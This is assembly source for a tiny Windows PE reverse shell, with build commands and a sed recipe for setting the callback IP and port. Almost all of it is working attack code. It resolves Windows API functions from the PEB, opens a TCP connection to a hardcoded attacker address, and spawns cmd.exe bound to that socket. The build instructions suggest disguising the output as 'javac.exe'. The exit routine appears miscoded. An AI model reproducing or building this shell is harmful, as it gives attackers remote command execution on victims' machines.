; TINY-PE Reverse Shell
; Very small PE executable reverse shell program
;
; $ nasm -f bin -o javac.exe exploit.asm
; 
; OR 
;
; LHOST=192.168.1.2
; LPORT=443
; LHOSTHEX=$(python3 -c "print('0x'+''.join([ '%02x'%int(c) for c in '$LHOST'.split('.')][-1::-1]))")
; LPORTHEX=$(python3 -c "s='%04x'%int('$LPORT');print('0x%s%s0002' %(s[2:],s[:2]))")
; sed -e s/0x8877a8c0/$LHOSTHEX/ -e s/0x5c110002/$LPORTHEX/ -i exploit.asm
; nasm -f bin -o exploit.exe exploit.asm
;
; BASED ON:
; * Tiny-PE
;   http://www.phreedom.org/research/tinype/  tiny.asm
; * GetProcAddress finder
;   https://www.exploit-db.com/shellcodes/48116
; * Reverse shell:
;   http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/
;===============================================================================
; P E   H E A D E R  (See ref mentionned above)
BITS 32
; MZ header
; The only two fields that matter are e_magic and e_lfanew
mzhdr:
    dw "MZ"                       ; e_magic
    dw 0                          ; e_cblp UNUSED
    dw 0                          ; e_cp UNUSED
    dw 0                          ; e_crlc UNUSED
    dw 0                          ; e_cparhdr UNUSED
    dw 0                          ; e_minalloc UNUSED
    dw 0                          ; e_maxalloc UNUSED
    dw 0                          ; e_ss UNUSED
    dw 0                          ; e_sp UNUSED
    dw 0                          ; e_csum UNUSED
    dw 0                          ; e_ip UNUSED
    dw 0                          ; e_cs UNUSED
    dw 0                          ; e_lsarlc UNUSED
    dw 0                          ; e_ovno UNUSED
    times 4 dw 0                  ; e_res UNUSED
    dw 0                          ; e_oemid UNUSED
    dw 0                          ; e_oeminfo UNUSED
    times 10 dw 0                 ; e_res2 UNUSED
    dd pesig                      ; e_lfanew

; PE signature
pesig:
    dd "PE"

; PE header
pehdr:
    dw 0x014C                     ; Machine (Intel 386)
    dw 1                          ; NumberOfSections
    dd 0x4545BE5D                 ; TimeDateStamp UNUSED
    dd 0                          ; PointerToSymbolTable UNUSED
    dd 0                          ; NumberOfSymbols UNUSED
    dw opthdrsize                 ; SizeOfOptionalHeader
    dw 0x103                      ; Characteristics (no relocations, executable, 32 bit)

; PE optional header
filealign equ 1
sect_align equ 1
%define round(n, r) (((n+(r-1))/r)*r)
opthdr:
    dw 0x10B                      ; Magic (PE32)
    db 8                          ; MajorLinkerVersion UNUSED
    db 0                          ; MinorLinkerVersion UNUSED
    dd round(codesize, filealign) ; SizeOfCode UNUSED
    dd 0                          ; SizeOfInitializedData UNUSED
    dd 0                          ; SizeOfUninitializedData UNUSED
    dd start                      ; AddressOfEntryPoint
    dd code                       ; BaseOfCode UNUSED
    dd round(filesize, sect_align) ; BaseOfData UNUSED
    dd 0x400000                   ; ImageBase
    dd sect_align                  ; SectionAlignment
    dd filealign                  ; FileAlignment
    dw 4                          ; MajorOperatingSystemVersion UNUSED
    dw 0                          ; MinorOperatingSystemVersion UNUSED
    dw 0                          ; MajorImageVersion UNUSED
    dw 0                          ; MinorImageVersion UNUSED
    dw 4                          ; MajorSubsystemVersion
    dw 0                          ; MinorSubsystemVersion UNUSED
    dd 0                          ; Win32VersionValue UNUSED
    dd round(filesize, sect_align) ; SizeOfImage
    dd round(hdrsize, filealign)  ; SizeOfHeaders
    dd 0                          ; CheckSum UNUSED
    dw 2                          ; Subsystem (Win32 GUI)
    dw 0x400                      ; DllCharacteristics UNUSED
    dd 0x100000                   ; SizeOfStackReserve UNUSED
    dd 0x1000                     ; SizeOfStackCommit
    dd 0x100000                   ; SizeOfHeapReserve
    dd 0x1000                     ; SizeOfHeapCommit UNUSED
    dd 0                          ; LoaderFlags UNUSED
    dd 16                         ; NumberOfRvaAndSizes UNUSED

; Data directories
    times 16 dd 0, 0
opthdrsize equ $ - opthdr

; PE code section
    db ".text", 0, 0, 0           ; Name
    dd codesize                   ; VirtualSize
    dd round(hdrsize, sect_align)  ; VirtualAddress
    dd round(codesize, filealign) ; SizeOfRawData
    dd code                       ; PointerToRawData
    dd 0                          ; PointerToRelocations UNUSED
    dd 0                          ; PointerToLinenumbers UNUSED
    dw 0                          ; NumberOfRelocations UNUSED
    dw 0                          ; NumberOfLinenumbers UNUSED
    dd 0x60000020                 ; Characteristics (code, execute, read) UNUSED
hdrsize equ $ - $$

; PE code section data
align filealign, db 0

;===============================================================================
; C O D E   S E C T I O N
code:
; Entry point

start:
  ;Create a new stack frame
  mov ebp, esp            ; Set base stack pointer for new stack-frame
  sub esp, 0x20           ; Decrement the stack by 0x20 bytes

  ; Stack schema
      ; [EBP-0x 18]		Number of Functions to stack-frame
      ; [EBP-0x 14]		&AddressTable
      ; [EBP-0x 10]		&OrdinalTable
      ; [EBP-0x C]		&NamePointerTable
      ; [EBP-0x 8]		&kernel32.dll
      ; [EBP-0x 4]
      ; [EBP-0x 0]
  ;-------------------------------------------------------------------------------
  ; Find GetProcAddress()

	; Find kernel32.dll base address
	 xor ebx, ebx            ; EBX = 0x00000000
	 mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
	 mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
	 mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
	 mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
	 mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
	 mov eax, [ebx+0x8]      ; EAX = &kernel32.dll
	 mov [ebp-0x08], eax      ; [EBP-0x08] = &kernel32.dll

	; Find address of the Export Table within kernel32.dll
	 mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader  = 0xF8
	 add ebx, eax            ; EBX = &NewEXEHeader        = 0xF8 + &kernel32.dll
	 mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable      = 0x777B0 = [&NewExeHeader + 0x78]
	 add ebx, eax            ; EBX = &ExportTable         = RVA ExportTable + &kernel32.dll

	; Find address of the Name Pointer Table within kernel32.dll
	 mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable = 0x790E0
	 add edi, eax            ; EDI = &NamePointerTable    = 0x790E0 + &kernel32.dll
	 mov [ebp-0xC], edi      ; [ebp-0xC] = &NamePointerTable

	; Find address of the Ordinal Table
	 mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable     = 0x7A9E8
	 add ecx, eax            ; ECX = &OrdinalTable        = 0x7A9E8 + &kernel32.dll
	 mov [ebp-0x10], ecx     ; [ebp-0x10] = &OrdinalTable

	; Find the address of the Address Table
	 mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable     = 0x777CC
	 add edx, eax            ; EDX = &AddressTable        = 0x777CC + &kernel32.dll
	 mov [ebp-0x14], edx     ; [ebp-0x14] = &AddressTable

	; Find Number of Functions within the Export Table of kernel32.dll
	 mov edx, [ebx+0x14]     ; EDX = Number of Functions  = 0x642
	 mov [ebp-0x18], edx     ; save value of Number of Functions to stack-frame

   ; Find &"GetProcAddress"
   push 0x007373      ; ss
   push 0x65726464    ; erdd
   push 0x41636f72    ; Acor
   push 0x50746547    ; PteG
   mov ebx, esp       ; ebx = &"GetProcAddress"
; int 3
findFuncAddress:
     xor eax, eax            ; EAX = Counter = 0
     mov edx, [ebp-0x18]     ; get value of Number of Functions from stack-frame
   	; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
findFuncAddress_loop:
     mov edi, [ebp-0x0C]     ; EDI = &NamePointerTable
     mov esi, ebx            ; ESI = &FuncName string
     mov ecx, 15             ; ECX = len(FuncName)
     cld                     ; clear direction flag - Process strings from left to right
     mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
     add edi, [ebp-0x08]     ; EDI = &NameString         = RVA NameString + &kernel32.dll
     repe cmpsb              ; compare first 8 bytes of [&NameString] to "WinExec,0x00"
     jz findFuncAddress_found; If string at [&NameString] == "WinExec,0x00", then end loop
     inc eax                 ; else Counter ++
     cmp eax, edx            ; Does EAX == Number of Functions?
     jb findFuncAddress_loop ; If EAX != Number of Functions, then restart the loop
findFuncAddress_found:
   	; Find the address of function by using the last value of the Counter
     mov ecx, [ebp-0x10]     ; ECX = &OrdinalTable
     mov edx, [ebp-0x14]     ; EDX = &AddressTable
     mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber   = [&OrdinalTable + (Counter*2)]
     mov eax, [edx + eax*4]  ; EAX = RVA func        = [&AddressTable + ordinalNumber]
     add eax, [ebp-0x8]      ; EAX = &funcAddr       = RVA func + &kernel32.dll
     mov ebx, eax            ; ebx = &GetProcAddress *****
; int 3

  ; ----------------------------------------------------------------------------
  ; LoadLibraryA(ws2_32)

  ; GetProcAddress(Kernell32.dll, LoadLibraryA)
  push 0x00       ; \x00
  push 0x41797261 ; Ayra
  push 0x7262694c ; rbiL
  push 0x64616f4c ; daoL
  push esp
  mov eax, [ebp-0x8]; &Kernell32.dll
  push eax
  call ebx        ; eax = &loadLibraryA()
; int 3

  ; LoadLibraryA("ws2_32")
  push 0x003233   ; 23
  push 0x5f327377 ; _2sw
  push esp
  call eax
  mov esi, eax    ; esi = &ws2_32 *****
; int 3

  ; ----------------------------------------------------------------------------
  ; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)

  ; GetProcAddress(ws2_32.dll, WSAStartUp)
  push 0x007075   ; pU
  push 0x74726174 ; trat
  push 0x53415357 ; SASW
  push esp
  push esi        ; &ws2_32.dll
  call ebx        ; eax = &WSAStartup()
; int 3

  ; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)
  sub esp, 0x0190 ; allocate buffer for wsdata_pointer
  push esp        ; push wsadata_pointer
  push 0x0202     ; push MAKEWORD(2, 2) ; version >= 2.2
  call eax        ; call WSAStartUp()

  ; ----------------------------------------------------------------------------
  ; WSASocket(AF_INET = 2, SOCK_STREAM = 1, IPPROTO_TCP = 6,
  ;   NULL, (unsigned int)NULL, (unsigned int)NULL);

  ; GetProcAddress(ws2_32.dll, WSASocketA)
; int 3
  push 0x004174   ; At
  push 0x656b636f ; ekco
  push 0x53415357 ; SASW
  push esp
  push esi
  call ebx        ; eax = &WSASocketA()
; int 3

  ; WSASocket(AF_INET = 2, ...)
  push 0
  push 0
  push 0
  push 0x6
  push 1
  push 2
; int 3
  call eax        ; eax = WSASocket(AF_INET = 2, ...);
; int 3
  mov edi, eax    ; edi = socket *****
; int 3


  ; ----------------------------------------------------------------------------
  ; connect(sckt, (SOCKADDR*) &hax, sizeof(hax) = 16);

  ; GetProcAddress(ws2_32.dll, connect)
  push 0x00746365 ; tce
  push 0x6e6e6f63 ; nnoc
  push esp
  push esi
  call ebx        ; eax = &WSASocketA())

  push 0x8877a8c0     ; ip 192.168.119.136
  push 0x5c110002     ; port 4444 and AD_INET (2=TCP/IPv4)
  mov edx, esp        ; edx -> 2 4444 192,168,119,136
  push byte 0x10
  push edx
  push edi
; int 3
  call eax ; connect(...)
; int 3


  ;-----------------------------------------------------------------------------
  ; Create process for cmd with pipe redirection
  ; CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

  ; GetProcAddress(CreateProcesA)
  push 0x00004173   ; 'sA\x00\x00'
  push 0x7365636f   ; 'oces'
  push 0x72506574   ; 'tePr'
  push 0x61657243   ; 'Crea'
  push esp
  mov eax, [ebp-0x8]; &Kernell32.dll
  push eax
  call ebx          ; eax = &CreateProcess()
; int 3

  ; Process info struct (16 bytes)
  xor edx, edx
  push edx
  push edx
  push edx
  push edx
  mov  esi, esp     ; esi = &processInfo
  ; Startup info struct
  push edi              ; hStdError   : sckt
  push edi              ; hStdOutput  : sckt
  push edi              ; hStdInput   : sckt
  push edx              ; lpReserved2 : 0 (NULL)
  push edx              ; cbReserved2, wShowWindow  : 0
  push 0x0101           ; dwFlags         : 0x0101
  push edx              ; dwFillAttribute : 0
  push edx              ; dwYCountChars   : 0
  push edx              ; dwXCountChars   : 0
  push edx              ; dwYSize         : 0
  push edx              ; dwXSize         : 0
  push edx              ; dwY             : 0
  push edx              ; dwX             : 0
  push edx              ; lpTitle         : 0
  push edx              ; lpDesktop       : 0
  push edx              ; lpReserved      : 0
  push 0x44             ; cd              : 0x44 (size of structure)
  mov edi, esp      ; edi = &startupinfo

  push 0x00657865   ; exe
  push 0x2e646d63   ; .dmc
  mov ecx, esp      ; ecx = &"cmd.exe"

  ; Stack args for CreateProcessA
  ; (NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
  push esi    ; &processInfo
  push edi    ; &startupinfo
  push edx    ; NULL
  push edx    ; NULL
  push edx    ; 0
  push 0x01   ; TRUE InheritHandles (needed for the stream redirection ?)
  push edx    ; NULL
  push edx    ; NULL
  push ecx    ; "cmd.exe"
  push edx    ; NULL
  call eax    ; Call CreateProcessA( calc , ...... )
; int 3

 ;------------------------------------------------------------------------------
 ; ExitProcess

  ; GetProcAddress(ExitProcess)
  push 0x00737365 ; sse
  push 0x636f7250 ; corP
  push 0x74697845 ; tixE
  push esp
  mov ebx, [ebp-0x8]  ; &Kernell32.dll
  push ebx
  call ebx    ; eax = &ExitProcess()
  push 0
  call eax    ; ExitProcess(0)

;===============================================================================
codesize equ $ - code
filesize equ $ - $$
